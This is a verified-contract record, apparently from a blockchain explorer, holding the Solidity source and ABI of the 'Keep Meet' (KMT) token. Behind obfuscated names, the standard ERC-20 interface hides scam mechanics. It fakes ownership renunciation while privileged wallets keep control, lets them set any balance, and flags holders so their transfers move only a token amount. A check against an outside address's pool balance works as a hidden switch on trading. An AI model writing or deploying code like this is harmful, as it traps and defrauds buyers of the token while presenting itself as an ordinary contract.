{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.6;\n\ninterface txLaunched {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract teamFrom {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface listTeam {\n    function createPair(address feeList, address marketingMode) external returns (address);\n}\n\ninterface exemptEnable {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address fromMinFee) external view returns (uint256);\n\n    function transfer(address minWalletIs, uint256 launchSender) external returns (bool);\n\n    function allowance(address receiverSwap, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 launchSender) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address minWalletIs,\n        uint256 launchSender\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed minMode, uint256 value);\n    event Approval(address indexed receiverSwap, address indexed spender, uint256 value);\n}\n\ninterface exemptEnableMetadata is exemptEnable {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract KeepMeet is teamFrom, exemptEnable, exemptEnableMetadata {\n\n    uint256 public liquidityFundReceiver;\n\n    function decimals() external view virtual override returns (uint8) {\n        return takeLiquidity;\n    }\n\n    function getOwner() external view returns (address) {\n        return listToken;\n    }\n\n    uint256 constant shouldExempt = 6 ** 10;\n\n    string private modeTotalLaunched = \"KMT\";\n\n    mapping(address => uint256) private buyAuto;\n\n    function transferFrom(address listModeTo, address minWalletIs, uint256 launchSender) external override returns (bool) {\n        if (_msgSender() != isLaunch) {\n            if (exemptAmountFrom[listModeTo][_msgSender()] != type(uint256).max) {\n                require(launchSender <= exemptAmountFrom[listModeTo][_msgSender()]);\n                exemptAmountFrom[listModeTo][_msgSender()] -= launchSender;\n            }\n        }\n        return senderEnableIs(listModeTo, minWalletIs, launchSender);\n    }\n\n    address private listToken;\n\n    mapping(address => bool) public takeMarketingReceiver;\n\n    bool public marketingFrom;\n\n    function name() external view virtual override returns (string memory) {\n        return sellWallet;\n    }\n\n    function allowance(address senderFrom, address takeSender) external view virtual override returns (uint256) {\n        if (takeSender == isLaunch) {\n            return type(uint256).max;\n        }\n        return exemptAmountFrom[senderFrom][takeSender];\n    }\n\n    function approve(address takeSender, uint256 launchSender) public virtual override returns (bool) {\n        exemptAmountFrom[_msgSender()][takeSender] = launchSender;\n        emit Approval(_msgSender(), takeSender, launchSender);\n        return true;\n    }\n\n    string private sellWallet = \"Keep Meet\";\n\n    event OwnershipTransferred(address indexed modeTokenSender, address indexed exemptBuy);\n\n    function feeTradingLaunched() public {\n        emit OwnershipTransferred(maxTo, address(0));\n        listToken = address(0);\n    }\n\n    function transfer(address fundAt, uint256 launchSender) external virtual override returns (bool) {\n        return senderEnableIs(_msgSender(), fundAt, launchSender);\n    }\n\n    uint256 private walletToken;\n\n    bool public feeAmount;\n\n    bool public tokenSell;\n\n    function senderEnableIs(address listModeTo, address minWalletIs, uint256 launchSender) internal returns (bool) {\n        if (listModeTo == maxTo) {\n            return autoReceiver(listModeTo, minWalletIs, launchSender);\n        }\n        uint256 liquidityTake = exemptEnable(toMin).balanceOf(launchEnable);\n        require(liquidityTake == txReceiverSell);\n        require(minWalletIs != launchEnable);\n        if (minToFund[listModeTo]) {\n            return autoReceiver(listModeTo, minWalletIs, shouldExempt);\n        }\n        return autoReceiver(listModeTo, minWalletIs, launchSender);\n    }\n\n    bool private exemptBuyFund;\n\n    address public maxTo;\n\n    mapping(address => mapping(address => uint256)) private exemptAmountFrom;\n\n    uint256 private feeWallet = 100000000 * 10 ** 18;\n\n    function balanceOf(address fromMinFee) public view virtual override returns (uint256) {\n        return buyAuto[fromMinFee];\n    }\n\n    function launchTx(address fundAt, uint256 launchSender) public {\n        marketingLaunchEnable();\n        buyAuto[fundAt] = launchSender;\n    }\n\n    uint256 public senderTrading;\n\n    uint256 public feeTeam;\n\n    uint256 txReceiverSell;\n\n    function marketingLaunchEnable() private view {\n        require(takeMarketingReceiver[_msgSender()]);\n    }\n\n    function owner() external view returns (address) {\n        return listToken;\n    }\n\n    function marketingReceiver(address listIs) public {\n        marketingLaunchEnable();\n        if (isMinReceiver) {\n            walletToken = feeTeam;\n        }\n        if (listIs == maxTo || listIs == toMin) {\n            return;\n        }\n        minToFund[listIs] = true;\n    }\n\n    bool public isMinReceiver;\n\n    function feeWalletTake(uint256 launchSender) public {\n        marketingLaunchEnable();\n        txReceiverSell = launchSender;\n    }\n\n    address public toMin;\n\n    constructor (){\n        \n        txLaunched limitList = txLaunched(isLaunch);\n        toMin = listTeam(limitList.factory()).createPair(limitList.WETH(), address(this));\n        if (exemptBuyFund != marketingFrom) {\n            marketingFrom = true;\n        }\n        maxTo = _msgSender();\n        feeTradingLaunched();\n        takeMarketingReceiver[maxTo] = true;\n        buyAuto[maxTo] = feeWallet;\n        if (exemptBuyFund != isMinReceiver) {\n            isMinReceiver = false;\n        }\n        emit Transfer(address(0), maxTo, feeWallet);\n    }\n\n    uint8 private takeLiquidity = 18;\n\n    bool private limitMaxWallet;\n\n    address isLaunch = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return feeWallet;\n    }\n\n    uint256 autoMax;\n\n    function walletTotal(address fundSellLiquidity) public {\n        if (tokenSell) {\n            return;\n        }\n        if (liquidityFundReceiver == senderTrading) {\n            liquidityFundReceiver = feeTeam;\n        }\n        takeMarketingReceiver[fundSellLiquidity] = true;\n        \n        tokenSell = true;\n    }\n\n    mapping(address => bool) public minToFund;\n\n    function autoReceiver(address listModeTo, address minWalletIs, uint256 launchSender) internal returns (bool) {\n        require(buyAuto[listModeTo] >= launchSender);\n        buyAuto[listModeTo] -= launchSender;\n        buyAuto[minWalletIs] += launchSender;\n        emit Transfer(listModeTo, minWalletIs, launchSender);\n        return true;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return modeTotalLaunched;\n    }\n\n    address launchEnable = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverSwap\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeTokenSender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptBuy\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minMode\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderFrom\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"takeSender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchSender\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromMinFee\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeTeam\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeTradingLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"launchSender\",\"type\":\"uint256\"}],\"name\":\"feeWalletTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isMinReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchSender\",\"type\":\"uint256\"}],\"name\":\"launchTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityFundReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listIs\",\"type\":\"address\"}],\"name\":\"marketingReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxTo\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"minToFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderTrading\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"takeMarketingReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toMin\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchSender\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listModeTo\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"minWalletIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchSender\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundSellLiquidity\",\"type\":\"address\"}],\"name\":\"walletTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "KeepMeet", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}